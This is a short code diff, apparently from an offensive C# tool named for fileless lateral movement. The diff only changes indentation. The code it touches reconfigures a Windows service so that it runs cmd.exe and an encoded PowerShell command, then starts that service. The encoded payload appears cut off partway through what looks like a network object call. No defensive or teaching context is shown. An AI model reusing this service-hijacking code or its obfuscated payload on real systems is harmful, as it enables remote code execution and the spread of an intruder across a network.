@@ -29,7 +29,7 @@ namespace filelessmovement
             IntPtr schService = OpenService(SCMHandle, ServiceName, 0xF01FF);
 
             //string payload = "notepad.exe";
-                       string payload = "C:\\windows\\system32\\cmd.exe /c powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuA";
+            string payload = "C:\\windows\\system32\\cmd.exe /c powershell -EncodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuA";
 
             bool bResult = ChangeServiceConfigA(schService, 0xffffffff, 3, 0, payload, null, null, null, null, null, null);
             bResult = StartService(schService, 0, null);
